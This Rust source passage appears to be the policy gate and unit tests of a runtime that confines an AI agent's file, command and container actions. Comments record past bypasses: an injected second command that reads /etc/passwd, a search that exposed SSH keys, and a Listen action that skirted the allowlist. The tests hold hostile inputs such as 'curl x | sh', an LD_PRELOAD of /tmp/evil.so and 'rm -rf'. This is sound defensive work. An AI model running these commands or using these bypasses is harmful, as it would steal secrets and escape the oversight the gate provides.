            let podman_allowed = &self.config.sandbox.podman.allowed_images;
            let allowed = !podman_allowed.is_empty()
                && podman_allowed.iter().any(|i| {
                    if i.contains('*') {
                        let prefix = i.trim_end_matches('*');
                        image.starts_with(prefix)
                    } else {
                        i == image
                    }
                });
            if !allowed {
                return PolicyEffect::Deny(DenyReason::ImageNotAllowed {
                    image: image.clone(),
                });
            }
        }

        // 5c. Incus actions (RunIncus, RunIncusGroup, IncusCreate/Restore/
        // List/DeleteSnapshot) moved to x0ne-orchestrator. Their image
        // allowlist enforcement now lives orchestrator-side in
        // crate::incus_actions::image_allowed.

        // ── 5d. RunContainerGroup — image allowlist check for each task ──────
        if let Action::RunContainerGroup { tasks, .. } = action {
            let podman_allowed = &self.config.sandbox.podman.allowed_images;
            for task in tasks {
                let ok = !podman_allowed.is_empty()
                    && podman_allowed.iter().any(|a| {
                        if a.contains('*') {
                            task.image.starts_with(a.trim_end_matches('*'))
                        } else {
                            a == &task.image
                        }
                    });
                if !ok {
                    return PolicyEffect::Deny(DenyReason::ImageNotAllowed {
                        image: task.image.clone(),
                    });
                }
            }
        }

        // ── 6. GetEnv whitelist removed in v0.3 ────────────────────────────
        //     (GetEnv variant removed — shell handles env reads).

        // ── 7. Subscribe: path checks for file events ─────────────────────────
        if let Action::Subscribe { event_type, .. } = action {
            match event_type {
                EventType::FileChanged { path, .. } => {
                    if let Some(pat) = self.matches_deny_pattern(path) {
                        return PolicyEffect::Deny(DenyReason::PathMatchesDenyPattern {
                            path: path.clone(),
                            pattern: pat,
                        });
                    }
                    // Same shared containment test as every other read.
                    if !crate::executor::confine::is_within_roots(
                        std::path::Path::new(path),
                        &self.read_roots,
                    ) {
                        return PolicyEffect::Deny(DenyReason::PathNotInAllowlist {
                            path: path.clone(),
                            access: PathAccess::Read,
                        });
                    }
                }
                EventType::FileCreated { dir, .. } => {
                    if !crate::executor::confine::is_within_roots(
                        std::path::Path::new(dir),
                        &self.read_roots,
                    ) {
                        return PolicyEffect::Deny(DenyReason::PathNotInAllowlist {
                            path: dir.clone(),
                            access: PathAccess::Read,
                        });
                    }
                }
                EventType::ProcessExited { .. } | EventType::PortOpen { .. } => {}
            }
        }

        PolicyEffect::Allow
    }

    // ── Helpers ───────────────────────────────────────────────────────────────

    /// Extract paths from an action and canonicalize them to prevent
    /// path traversal (`../`) and symlink bypasses against deny patterns.
    pub(crate) fn paths_of(&self, action: &Action) -> Vec<String> {
        let raw = match action {
            Action::ReadFile { path, .. } => vec![path.clone()],
            Action::ReadFiles { paths, .. } => paths.clone(),
            Action::WriteFile { path, .. } => vec![path.clone()],
            Action::EditFile { path, .. } => vec![path.clone()],
            Action::ApplyPatch { path, .. } => vec![path.clone()],
            Action::StatFiles { paths, .. } => paths.clone(),
            Action::PatchSet { patches, .. } => patches.iter().map(|p| p.path.clone()).collect(),
            Action::SearchAndRead { root, .. } => vec![root.clone()],
            Action::SafeTest { path, .. } => {
                path.as_ref().map(|p| vec![p.clone()]).unwrap_or_default()
            }
            Action::MoveToTrash { path } => vec![path.clone()],
            Action::SearchCode { root, .. } => vec![root.clone()],
            Action::ReadLogs { path, .. } => vec![path.clone()],
            Action::RunCommand { cwd, .. } | Action::TermOpen { cwd, .. } => {
                cwd.as_ref().map(|p| vec![p.clone()]).unwrap_or_default()
            }
            Action::FileInfo { path } => vec![path.clone()],
            Action::Checksum { path, .. } => vec![path.clone()],
            Action::CreateSnapshot { paths, .. } => paths.clone(),
            // These were absent, so the gate never saw their paths — not even
            // for deny_path_patterns, which apply to every extracted path
            // regardless of read/write classification. Diff{files} is also
            // added to `is_read_action` below so the read roots apply to it at
            // the gate. DocumentExtract/DatasetGenerate mix a read (input) and
            // a write (output) in one action, so their precise root checks are
            // done per-path by the executor (`executor::ml`); listing them here
            // gives them deny-pattern coverage at the gate as well.
            Action::Diff { a, b, files, .. } if *files => vec![a.clone(), b.clone()],
            // SECURITY: absent until 2026-09-11. `Subscribe::FileChanged`
            // confines its path (below); this one, which does the same watch
            // and then RUNS an action, did not — a recursive watch on `~/.ssh`
            // was accepted and its paths came back through `CheckHandle`,
            // which is in `ALWAYS_ALLOW`.
            Action::WatchAndReact { path, .. } => vec![path.clone()],
            Action::DocumentExtract { input, output, .. } => vec![input.clone(), output.clone()],
            Action::DatasetGenerate { output, .. } => vec![output.clone()],
            _ => vec![],
        };
        // Canonicalize each path to resolve symlinks and `..` components.
        // For paths that don't exist yet (write targets), fall back to
        // canonicalizing the parent and appending the filename; if even that
        // fails, tidy the string and anchor it on the cwd. That last branch
        // does NOT reject `..` in any meaningful sense — see `resolve_path`.
        raw.into_iter().map(|p| Self::resolve_path(&p)).collect()
    }

    /// Resolve a path to its canonical form, for the GATE's judgement only.
    /// - If the file exists, use `std::fs::canonicalize` (resolves symlinks + `..`).
    /// - If not (write target), canonicalize the parent dir and append the filename.
    /// - If even the parent doesn't exist, drop `..` components textually and
    ///   anchor what is left on the cwd.
    ///
    /// The third branch's `..` removal is COSMETIC, not a containment control.
    /// `is_within_roots` compares components as a prefix and returns true the
    /// moment the root runs out, so a `..` after the root's components passes
    /// it whether or not this function removed one (mutation run, 2026-08-15:
    /// deleting the filter changed no verdict in the crate). Containment is
    /// enforced by `executor::confine`, which re-resolves through
    /// `fs::canonicalize` before it opens anything.
    fn resolve_path(raw: &str) -> String {
        // SECURITY: a leading `~` is expanded by the function the executor
        // uses (`confine::resolve_read`). Without it the gate judged
        // `<cwd>/~/x` while the executor opened `$HOME/x` (2026-11-02).
        let expanded = crate::config::expand_tilde(raw);
        let p = expanded.as_path();

        // Fast path: file exists → full canonicalize (resolves symlinks)
        if let Ok(canonical) = std::fs::canonicalize(p) {
            return canonical.to_string_lossy().into_owned();
        }

        // File doesn't exist (e.g. write target) — canonicalize parent
        if let (Some(parent), Some(name)) = (p.parent(), p.file_name()) {
            if let Ok(canonical_parent) = std::fs::canonicalize(parent) {
                return canonical_parent.join(name).to_string_lossy().into_owned();
            }
        }

        // Last resort, for the edge case where neither the file nor its parent
        // exists. Drop `..` components so the path this gate REPORTS is tidy.
        // This is not a containment control and the word "reject" it used to
        // carry was wrong: `is_within_roots` is a component-prefix test that a
        // `..` sails past either way (see the doc-comment above).
        let cleaned: std::path::PathBuf = p
            .components()
            .filter(|c| !matches!(c, std::path::Component::ParentDir))
            .collect();
        if cleaned.is_absolute() {
            return cleaned.to_string_lossy().into_owned();
        }
        // A still-relative path is ANCHORED on the current directory — the same
        // directory the two `canonicalize` branches above resolve against, so
        // the three branches agree on what a relative path means.
        //
        // They did not. A bare filename has `parent() == Some("")`, which never
        // canonicalizes, so a missing bare name fell through here and stayed
        // relative — and a relative path is never component-wise inside an
        // absolute root (`confine::is_within_roots`). `ReadFile "X0NE.md"` on a
        // file that did not exist therefore came back "not under any allowed
        // path prefix" instead of "does not exist". Measured in the demo
        // enclave 2026-08-15 (run 9): the operator read it as "the agent can
        // read nothing" and the model spent its turns guessing at other roots.
        // `./X0NE.md` and `sub/X0NE.md` were reported correctly all along —
        // only the empty parent took this branch.
        //
        // SECURITY: this widens nothing, and it is worth being exact about
        // WHY, because the first version of this comment was not.
        //
        // It claimed the `..` strip above was what stopped an anchored path
        // from climbing out. It is not, and a mutation run on 2026-08-15 said
        // so: removing the strip changed no verdict anywhere in the crate.
        // `is_within_roots` is a pure component-PREFIX test — once the root's
        // components are exhausted it returns true, so a `..` sitting after
        // them sails straight through, stripped or not. The strip keeps the
        // path this gate REPORTS tidy; it is not a containment mechanism and
        // must not be cited as one.
        //
        // What actually holds: a cwd outside the roots still produces an
        // out-of-root absolute path, i.e. still a denial here; and the executor
        // independently re-resolves the path it opens through
        // `fs::canonicalize` — which does resolve `..` — and re-validates it
        // against the roots (`executor::confine`). That is the enforcement
        // point, and it is the only one. Measured the same day: a write to
        // `../outside/nonexistent-dir/x.md` passes THIS gate and is refused by
        // the executor. What changes here is only that a denial now tells the
        // truth about why — `not_found` rather than `policy_denied`.
        match std::env::current_dir() {
            Ok(cwd) => cwd.join(cleaned).to_string_lossy().into_owned(),
            // No cwd (deleted out from under us): stay relative, i.e. stay
            // denied. Fail closed.
            Err(_) => cleaned.to_string_lossy().into_owned(),
        }
    }

    /// Programs `action` runs, shells and `env` expanded; `Err` fails closed.
    /// Expanded: `RunCommand`, `Listen`, `WatchAndReact`'s inner action. Others keep
    /// `commands_of`: argv[0] only for `TermOpen`, `RunInSandbox`, `RunContainerGroup`.
    fn programs_to_authorize(&self, action: &Action) -> Result<Vec<String>, DenyReason> {
        use x0ne_actions::interpreter::{classify, Launched};
        // Bench profile: unchanged, no expansion. `allow_all_allows` passes any
        // whitespace-free program name, in a detected container only.
        if self.config.policy.allow_all_commands {
            return Ok(self.commands_of(action));
        }
        let argv = match action {
            Action::RunCommand { command, args, .. } => Some((command, args)),
            Action::Listen { command, args, .. } => Some((command, args)),
            Action::WatchAndReact { action, .. } => return self.programs_to_authorize(action),
            _ => return Ok(self.commands_of(action)),
        };
        let Some((command, args)) = argv else {
            return Ok(self.commands_of(action));
        };
        match classify(command, args) {
            Launched::Program => Ok(vec![command.clone()]),
            Launched::Via(progs) => {
                let mut out = Vec::with_capacity(progs.len() + 1);
                out.push(command.clone());
                out.extend(progs);
                Ok(out)
            }
            Launched::Opaque => Err(DenyReason::CommandNotAnalyzable {
                command: join_argv(command, args),
            }),
        }
    }

    /// Every program name this action would execute.
    ///
    /// Exec is not a RunCommand-only capability: `RunInSandbox` and
    /// `RunContainerGroup` take a full argv, `SafeTest` and `WatchAndReact`
    /// carry a command, and `ArtifactServe` carries a whitespace-separated one.
    /// All of them must face the same allowlist.
    pub(crate) fn commands_of(&self, action: &Action) -> Vec<String> {
        match action {
            Action::RunCommand { command, .. } => vec![command.clone()],
            // SECURITY: `Listen` spawns exactly what `RunCommand` spawns. It
            // was missing here for one day (2026-09-10) and in that day the
            // same argv `RunCommand` refused with `CommandNotAllowed` ran
            // through `Listen` under `Allow` — the code review caught it, the
            // policy matrix did not, because the matrix counts switches, not
            // allowlists. The test `listen_faces_the_same_gates_as_run_command`
            // now does.
            Action::Listen { command, .. } => vec![command.clone()],
            // SECURITY: a terminal program faces the allowlist like RunCommand,
            // in a container too (`sh` opened past `allowed_commands =
            // ["echo"]` under --isolation container). Allowing a shell allows
            // everything typed into it.
            Action::TermOpen { command, .. } => vec![command.clone()],
            // Fixed programs, but programs: the executors (`executor/cloud.rs`)
            // already refuse them when the binary is not allowlisted. Naming
            // them HERE makes the gate say the same thing as the executor, so
            // the refusal is visible before anything runs and liftable at the
            // prompt like every other `CommandNotAllowed`.
            Action::CloudCost { provider, .. } => crate::executor::cloud::provider_binary(provider)
                .map(|b| vec![b.to_string()])
                .unwrap_or_default(),
            Action::GpuStatus { .. } => vec!["nvidia-smi".to_string()],
            // `SshExec` is deliberately NOT here. `allowed_commands` lists
            // programs on THIS host; the command it carries runs on another
            // one, and pretending the local allowlist filters it would be a
            // gate that reads as protection and is not. Its class is
            // `Network`, so it is modifying — refused in `readonly`, asked in
            // `confirm` — and `touches_host` puts it behind the human gate on
            // every call. Owner's ruling, 2026-09-11: always confirmed, never
            // dispensed.
            Action::RunInSandbox { command, .. } => command.first().cloned().into_iter().collect(),
            Action::RunContainerGroup { tasks, .. } => tasks
                .iter()
                .filter_map(|t| t.command.first().cloned())
                .collect(),
            // SECURITY: the gate must see what the executor will spawn, so it
            // calls the executor's own tokeniser rather than a second one.
            // `split_whitespace().next()` used to stand here while the executor
            // handed the whole line to `sh -c`: with
            // `allowed_commands = ["python3"]`, the line
            // `python3 --version ; cat /etc/passwd > /tmp/leak` was gated on
            // `python3` and ran all three (measured 2026-08-15).
            //
            // When the line does NOT parse as an argv, the WHOLE line is handed
            // to the allowlist. It will not match — an operator lists programs,
            // not command lines — so the action is denied and the denial NAMES
            // the line instead of an innocuous first token. Fail closed, and
            // legible. The port is a placeholder: it cannot change the verdict
            // (`serve_command::the_allocated_port_cannot_change_the_verdict`).
            //
            // (SafeTest is excluded on purpose: it derives its own fixed
            // toolchain command from `kind`, never from agent-supplied text.)
            Action::ArtifactServe { command, .. } => {
                match x0ne_actions::serve_command::parse(command, 0) {
                    Ok(argv) => argv.into_iter().take(1).collect(),
                    Err(_) => vec![command.clone()],
                }
            }
            // Wraps another action — recurse so the nested exec is gated too.
            Action::WatchAndReact { action, .. } => self.commands_of(action),
            _ => vec![],
        }
    }

    /// Is `command` permitted by `allowed_commands`?
    ///
    /// SECURITY: matching used to accept `Path::file_name()`, so
    /// `allowed_commands = ["git"]` also authorized `/tmp/evil/git` — any
    /// planted binary with the right basename. When an allowlist is configured,
    /// a command must therefore be a BARE NAME (no path separator) and appear
    /// verbatim in the list; resolution against PATH is left to the OS. An
    /// operator who genuinely wants a specific binary lists its absolute path,
    /// which is matched exactly.
    ///
    /// SECURITY / BREAKING (2026-08-15): an EMPTY list now denies EVERY
    /// command. It used to `return None` — "no restriction configured" —
    /// which made the emptiest, most innocent-looking value in the whole
    /// `[policy]` table the most permissive one. Its two neighbours in that
    /// same table had already been flipped the other way (`allowed_read_paths`
    /// and `allowed_write_paths`: "BREAKING (Aug 2026): an EMPTY list now
    /// means DENY ALL"), so one table carried two opposite readings of `[]`
    /// ten lines apart. The shipped reference config had `allowed_commands =
    /// []` and `RunCommand = true`, and the audit of 2026-08-15 measured what
    /// that combination did over MCP: `run_command {"command":"id"}` returned
    /// the host's uid and groups.
    ///
    /// There is deliberately NO wildcard. "Allow everything" is not a value an
    /// operator should be able to reach by leaving a field alone, nor by
    /// typing three characters; if they want a command, they name it.
    ///
    /// A command granted at a prompt is matched by the same exact equality as
    /// a configured one, and a granted value has already been refused a path
    /// separator by `validate_command_grant` — so the SECURITY note above
    /// holds for grants without a second rule.
    /// True only when the runtime runs in a container it has detected. The
    /// flag alone is not enough: `confinement` checks the markers.
    pub(crate) fn terminals_are_sandboxed(&self) -> bool {
        matches!(
            crate::executor::isolation::confinement(&self.config.isolation),
            Ok(crate::executor::isolation::Confinement::Container)
        )
    }

    fn check_command_allowed(&self, command: &str) -> Option<DenyReason> {
        let allowlist = &self.config.policy.allowed_commands;
        if allowlist.iter().any(|c| c == command)
            || self.command_granted(command)
            || self.exec_root_allows(command)
            || self.allow_all_allows(command)
        {
            return None;
        }
        Some(DenyReason::CommandNotAllowed {
            command: command.to_string(),
        })
    }

    /// Bench-agentic: any program name, in a detected container only. A
    /// shell line still gets the "one program, no shell" refusal.
    fn allow_all_allows(&self, command: &str) -> bool {
        self.config.policy.allow_all_commands
            && !command.is_empty()
            && !command.chars().any(char::is_whitespace)
            && self.terminals_are_sandboxed()
    }

    /// An absolute path whose canonical target is a file under
    /// `allowed_exec_roots`, only in a detected container. Relative paths,
    /// `..` and symlinks out of the root stay denied.
    fn exec_root_allows(&self, command: &str) -> bool {
        let roots = &self.config.policy.allowed_exec_roots;
        if roots.is_empty() || !self.terminals_are_sandboxed() {
            return false;
        }
        let path = std::path::Path::new(command);
        if !path.is_absolute()
            || path
                .components()
                .any(|c| matches!(c, std::path::Component::ParentDir))
        {
            return false;
        }
        let Ok(real) = std::fs::canonicalize(path) else {
            return false;
        };
        real.is_file()
            && crate::executor::confine::is_within_roots(
                &real,
                &crate::executor::confine::normalize_roots(roots),
            )
    }

    /// The gate's refusal of a read of `path` (resolved), if any: the deny
    /// patterns first, then the read roots and the session's read grants.
    ///
    /// SECURITY: the gate judges the ROOT of a search, and SearchCode and
    /// SearchAndRead then read every file under it. Both walkers call this
    /// function on each entry (`executor::search::policy_walk`): measured
    /// 2026-11-02, a search rooted at `~` under the read-only MCP profile
    /// returned `~/.ssh/id_ed25519`, `.env` and `secrets/db`, which
    /// `ReadFile` refused one by one. One function, so the two cannot drift.
    pub fn read_refusal(&self, path: &str) -> Option<DenyReason> {
        if let Some(pattern) = self.matches_deny_pattern(path) {
            return Some(DenyReason::PathMatchesDenyPattern {
                path: path.to_string(),
                pattern,
            });
        }
        // Containment is decided by ONE implementation —
        // `executor::confine::is_within_roots` — shared with the executor
        // that actually opens the file. Two implementations would drift,
        // and the string `starts_with` used here previously also treated
        // `/srv/rootEVIL` as inside `/srv/root`.
        //
        // An empty root list means DENY ALL (it used to mean allow-all).
        // The policy gate and the executor must agree, otherwise the gate
        // reports "allow" for an access the executor will refuse.
        //
        // A root granted at a prompt is consulted with the SAME
        // containment test as a configured one, and AFTER the deny
        // patterns above — so a grant widens the allowlist and never
        // pierces the boundary.
        let candidate = std::path::Path::new(path);
        if !crate::executor::confine::is_within_roots(candidate, &self.read_roots)
            && !self.path_granted(candidate, PathAccess::Read)
        {
            return Some(DenyReason::PathNotInAllowlist {
                path: path.to_string(),
                access: PathAccess::Read,
            });
        }
        None
    }

    fn matches_deny_pattern(&self, path: &str) -> Option<String> {
        self.deny_patterns.first_match(path).map(str::to_string)
    }

    fn is_read_action(&self, action: &Action) -> bool {
        matches!(
            action,
            Action::ReadFile { .. }
                | Action::ReadFiles { .. }
                | Action::SearchCode { .. }
                | Action::SearchAndRead { .. }
                | Action::StatFiles { .. }
                | Action::ReadLogs { .. }
                | Action::FileInfo { .. }
                | Action::Checksum { .. }
                | Action::Diff { files: true, .. }
                | Action::CreateSnapshot { .. }
                | Action::ArtifactList
                | Action::Assert { .. }
        )
    }

    fn is_write_action(&self, action: &Action) -> bool {
        matches!(
            action,
            Action::WriteFile { .. }
                | Action::PatchSet { .. }
                | Action::EditFile { .. }
                | Action::ApplyPatch { .. }
                | Action::MoveToTrash { .. }
                | Action::RestoreSnapshot { .. }
                | Action::Try { .. }
                | Action::SafeChange { .. }
                | Action::ArtifactCreate { .. }
                | Action::ArtifactServe { .. }
                | Action::ArtifactSave { .. }
                | Action::ArtifactStop { .. }
                | Action::ArtifactDestroy { .. }
            // Since 2026-09-11 this list no longer decides the `readonly` /
            // `confirm` mode — the class does that (`is_modifying`, above).
            // It now serves only ONE purpose: saying which paths extracted by
            // `paths_of` are WRITE targets, for the write roots (step 4).
            //
            // `RunProgram`: no `path` field — the verifier will produce the
            // concrete paths — but the write classification applies.
            // `PreviewProgram` is NOT in it: it writes nothing.
                | Action::RunProgram { .. }
            // Both write the `output` path the model chose —
            // `executor/ml.rs` confines it as a write. Their class stays
            // `Network` / `ProcessSpawn` (the more dangerous of their two faces)
            // and this list states the other one.
                | Action::DatasetGenerate { .. }
                | Action::DocumentExtract { .. }
        )
    }

    fn is_desktop_action(&self, action: &Action) -> bool {
        matches!(
            action,
            Action::Screenshot { .. }
                | Action::GetWindowTree
                | Action::GetFocusedWindow
                | Action::MoveMouse { .. }
                | Action::Click { .. }
                | Action::DoubleClick { .. }
                | Action::Scroll { .. }
                | Action::TypeText { .. }
                | Action::PressKey { .. }
                | Action::PressKeyCombination { .. }
                | Action::FocusWindow { .. }
                | Action::SendNotification { .. }
                | Action::GetClipboard
                | Action::SetClipboard { .. }
        )
    }

    /// Public side-effect classification — used by `Simulate` to project
    /// what an action *would* do without running it. Each action falls into
    /// exactly one bucket. Composite actions (Pipeline/Try/SafeChange/If)
    /// return [`SideEffectClass::Composite`] — the walker recurses into them.
    pub fn classify(&self, action: &Action) -> SideEffectClass {
        // Delegates to the compiler-enforced exhaustive match on `Action`.
        // Do NOT reintroduce a chain of `matches!` helpers here: that shape is
        // exactly what let unlisted actions fall through to `Meta` and be
        // reported as inert by `Simulate` (August 2026 audit, finding 9).
        action.side_effect_class()
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::action::Action;
    use crate::config::AppConfig;

    fn permissive() -> AppConfig {
        let mut cfg = AppConfig::defaults();
        cfg.policy.mode = String::new(); // disable confirm/readonly gate for tests
        cfg.policy.default_effect = "allow".into();
        cfg.policy.deny_path_patterns = vec!["**/.ssh/**".into()];
        cfg.policy.allowed_commands = vec!["git".into(), "cargo".into()];
        // "Permissive" must now be stated explicitly: an empty list means
        // DENY ALL since the Aug 2026 confinement change. Root "/" keeps these
        // tests focused on the policy dimension they actually exercise;
        // containment itself is covered by executor::confine tests.
        cfg.policy.allowed_read_paths = vec!["/".to_string()];
        cfg.policy.allowed_write_paths = vec!["/".to_string()];
        cfg
    }

    fn make_engine(cfg: AppConfig) -> PolicyEngine {
        let actions = cfg.actions.clone();
        PolicyEngine::new(cfg, actions)
    }

    #[test]
    fn allow_read_file_by_default() {
        let engine = make_engine(permissive());
        let action = Action::ReadFile {
            path: "/tmp/hello.txt".into(),
            offset: 0,
            limit: None,
            start_line: None,
            limit_lines: None,
        };
        assert_eq!(engine.evaluate(&action), PolicyEffect::Allow);
    }

    /// A path the gate cannot resolve is judged from the SAME directory the
    /// resolvable ones are: the current one.
    ///
    /// `resolve_path` has three branches — the file exists, its parent exists,
    /// neither does — and the first two go through `fs::canonicalize`, which
    /// anchors a relative path on the cwd. The third did not, so a bare
    /// filename that does not exist stayed relative, and a relative path is
    /// never component-wise inside an absolute root: the gate answered
    /// `PathNotInAllowlist` for a file the roots plainly cover. The operator of
    /// the demo enclave read that as "the agent can read nothing" and the model
    /// spent its turns guessing at other roots (run 9, 2026-08-15).
    ///
    /// A failure here means a missing file is again indistinguishable from a
    /// forbidden one — which tells an agent to stop when it should retype.
    #[test]
    fn a_missing_bare_filename_is_judged_from_the_current_directory() {
        let engine = make_engine(permissive());
        let action = Action::ReadFile {
            path: "no-such-file-6b21f0.md".into(),
            offset: 0,
            limit: None,
            start_line: None,
            limit_lines: None,
        };
        // Roots are "/", so anchoring on any cwd lands inside them. The gate
        // must therefore let this through and leave the verdict to the
        // executor, which reports a genuine `not_found`.
        assert_eq!(engine.evaluate(&action), PolicyEffect::Allow);
    }

    /// SECURITY: anchoring an unresolvable path on the cwd GRANTS nothing — the
    /// root check still runs on the anchored result.
    ///
    /// This is the companion of the test above and the reason it is safe. If
    /// the fix had instead skipped the containment check for paths it could not
    /// resolve, the test above would still pass and this one would not. A
    /// failure here means an unresolvable path escapes the roots.
    #[test]
    fn anchoring_an_unresolvable_path_does_not_escape_the_roots() {
        let mut cfg = permissive();
        let elsewhere = tempfile::tempdir().unwrap();
        // A root that cannot contain the test process's cwd.
        cfg.policy.allowed_read_paths = vec![elsewhere.path().to_string_lossy().into_owned()];
        let engine = make_engine(cfg);
        let action = Action::ReadFile {
            path: "no-such-file-6b21f0.md".into(),
            offset: 0,
            limit: None,
            start_line: None,
            limit_lines: None,
        };
        assert!(
            matches!(
                engine.evaluate(&action),
                PolicyEffect::Deny(DenyReason::PathNotInAllowlist { .. })
            ),
            "an unresolved path anchored on a cwd OUTSIDE the roots stays refused"
        );
    }

    #[test]
    fn deny_disabled_action() {
        let mut cfg = permissive();
        cfg.actions.insert("WriteFile".into(), false);
        let engine = make_engine(cfg);
        let action = Action::WriteFile {
            path: "/tmp/x.txt".into(),
            content: "boom".into(),
        };
        assert!(matches!(
            engine.evaluate(&action),
            PolicyEffect::Deny(DenyReason::ActionDisabled)
        ));
    }

    #[test]
    fn deny_ssh_key_reads() {
        let engine = make_engine(permissive());
        let action = Action::ReadFile {
            path: "/home/user/.ssh/id_rsa".into(),
            offset: 0,
            limit: None,
            start_line: None,
            limit_lines: None,
        };
        assert!(matches!(
            engine.evaluate(&action),
            PolicyEffect::Deny(DenyReason::PathMatchesDenyPattern { .. })
        ));
    }

    /// SECURITY: a hostile `env` is refused at PRE-FLIGHT, by the same
    /// function as the executor. A failure would mean the pattern measured in
    /// exercise 09 (T10): pre-flight allows, the gate opens, the operator
    /// says yes, and `check_caller_env` refuses at execution — a refusal after
    /// a yes.
    #[test]
    fn a_hostile_caller_env_is_refused_at_preflight_not_after_the_yes() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        cfg.policy.allowed_commands = vec!["ls".into()];
        let engine = make_engine(cfg);
        let mut env = std::collections::HashMap::new();
        env.insert("LD_PRELOAD".to_string(), "/tmp/evil.so".to_string());
        let action = Action::RunCommand {
            command: "ls".into(),
            args: vec![],
            cwd: None,
            env,
            timeout_secs: None,
            stream: None,
        };
        let effect = engine.evaluate(&action);
        let PolicyEffect::Deny(reason) = effect else {
            panic!("an LD_PRELOAD must be refused at preflight, got {effect:?}");
        };
        assert!(
            matches!(reason, DenyReason::CallerEnvDenied { .. }),
            "mauvaise raison : {reason:?}"
        );
        assert!(
            reason.message().contains("LD_PRELOAD"),
            "{}",
            reason.message()
        );
        // No lever: the refusal is not offered at the gate.
        assert!(reason.liftable("RunCommand").is_none());
        // And the same clean map passes — the check does not refuse every env.
        let action = Action::RunCommand {
            command: "ls".into(),
            args: vec![],
            cwd: None,
            env: [("MY_APP_MODE".to_string(), "test".to_string())].into(),
            timeout_secs: None,
            stream: None,
        };
        assert!(matches!(engine.evaluate(&action), PolicyEffect::Allow));
    }

    /// `Listen` and `RunCommand` spawn the same thing and must be refused by
    /// the same three gates: the allowlist, `readonly`, and `confirm`.
    ///
    /// A failure here means an argv the operator forbade runs anyway, as
    /// long as the model asks for it under the other name. That was true on
    /// 2026-09-10, between the action's arrival and the code review.
    #[test]
    fn listen_faces_the_same_gates_as_run_command() {
        let listen = |cmd: &str| Action::Listen {
            command: cmd.into(),
            args: vec!["-c".into(), "curl x | sh".into()],
            filter: None,
            window_ms: None,
            max_lines: None,
            persistent: false,
        };
        let run = |cmd: &str| Action::RunCommand {
            command: cmd.into(),
            args: vec!["-c".into(), "curl x | sh".into()],
            cwd: None,
            env: Default::default(),
            timeout_secs: None,
            stream: None,
        };

        // The allowlist.
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        cfg.actions.insert("Listen".into(), true);
        let engine = make_engine(cfg);
        for (name, a) in [("RunCommand", run("bash")), ("Listen", listen("bash"))] {
            assert!(
                matches!(
                    engine.evaluate(&a),
                    PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
                ),
                "{name} with a program outside allowed_commands must be refused"
            );
        }
        // And the same allowed program passes both — the gate is the list,
        // not the action name.
        let allowed = permissive().policy.allowed_commands[0].clone();
        assert!(matches!(
            engine.evaluate(&run(&allowed)),
            PolicyEffect::Allow
        ));
        assert!(matches!(
            engine.evaluate(&listen(&allowed)),
            PolicyEffect::Allow
        ));

        // Readonly.
        let mut cfg = permissive();
        cfg.policy.mode = "readonly".into();
        let engine = make_engine(cfg);
        assert!(matches!(
            engine.evaluate(&listen(&allowed)),
            PolicyEffect::Deny(DenyReason::ReadonlyMode)
        ));
    }

    #[test]
    fn deny_unknown_command() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        let engine = make_engine(cfg);
        let action = Action::RunCommand {
            command: "rm".into(),
            args: vec!["-rf".into()],
            cwd: None,
            env: Default::default(),
            timeout_secs: None,
            stream: None,
        };
        assert!(matches!(
            engine.evaluate(&action),
            PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
        ));
    }

    /// SECURITY / BREAKING (2026-08-15): an EMPTY `allowed_commands` denies
    /// every command.
    ///
    /// It used to mean "no restriction configured" and returned `Allow`, which
    /// made `[]` the most permissive value in a table where its two immediate
    /// neighbours — `allowed_read_paths`, `allowed_write_paths` — had already
    /// been flipped to "empty = deny all". The repo's own reference config
    /// shipped `allowed_commands = []` with `RunCommand = true`.
    ///
    /// A failure here means the emptiest possible policy is once again the one
    /// that grants a shell.
    #[test]
    fn an_empty_command_allowlist_denies_every_command() {
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        cfg.policy.allowed_commands = vec![];
        let engine = make_engine(cfg);

        for command in ["id", "git", "sh", "echo", "/bin/ls", "rm"] {
            let action = Action::RunCommand {
                command: command.into(),
                args: vec![],
                cwd: None,
                env: Default::default(),
                timeout_secs: None,
                stream: None,
            };
            assert!(
                matches!(
                    engine.evaluate(&action),
                    PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
                ),
                "an empty allowed_commands must deny `{command}`, not authorize it"
            );
        }
    }

    /// There is no wildcard, on purpose: "allow everything" must not be
    /// reachable by typing three characters. `*` is a command name like any
    /// other — it authorizes a binary called `*` and nothing else.
    #[test]
    fn no_wildcard_smuggles_a_blanket_allow_into_the_command_allowlist() {
        for pattern in ["*", "**", ".*", "all"] {
            let mut cfg = permissive();
            cfg.actions.insert("RunCommand".into(), true);
            cfg.policy.allowed_commands = vec![pattern.into()];
            let engine = make_engine(cfg);
            let action = Action::RunCommand {
                command: "id".into(),
                args: vec![],
                cwd: None,
                env: Default::default(),
                timeout_secs: None,
                stream: None,
            };
            assert!(
                matches!(
                    engine.evaluate(&action),
                    PolicyEffect::Deny(DenyReason::CommandNotAllowed { .. })
                ),
                "allowed_commands = [\"{pattern}\"] must not act as a blanket allow"
            );
        }
    }

    /// A binary the agent built under an exec root, in a detected container.
    fn exec_root_fixture(container: bool) -> (tempfile::TempDir, PolicyEngine, std::path::PathBuf) {
        let root = tempfile::tempdir().unwrap();
        let work = root.path().join("work");
        let bin = work.join("mini-nmap/target/release/mini-nmap");
        std::fs::create_dir_all(bin.parent().unwrap()).unwrap();
        std::fs::write(&bin, "").unwrap();
        std::fs::write(root.path().join(".dockerenv"), "").unwrap();
        let mut cfg = permissive();
        cfg.actions.insert("RunCommand".into(), true);
        cfg.policy.allowed_exec_roots = vec![work.display().to_string()];
        cfg.isolation.container_probe_root = Some(root.path().to_path_buf());
        cfg.isolation.mode = if container {
            crate::config::IsolationMode::Container
        } else {
            crate::config::IsolationMode::Bwrap
        };
        let engine = make_engine(cfg);
        (root, engine, bin)
    }

    fn run_cmd(command: &str) -> Action {
        Action::RunCommand {
            command: command.into(),
            args: vec!["127.0.0.1".into()],
            cwd: None,
            env: Default::default(),
            timeout_secs: None,
            stream: None,
        }
    }

    #[test]
    fn a_binary_built_under_an_exec_root_runs_in_a_container() {
        let (_root, engine, bin) = exec_root_fixture(true);
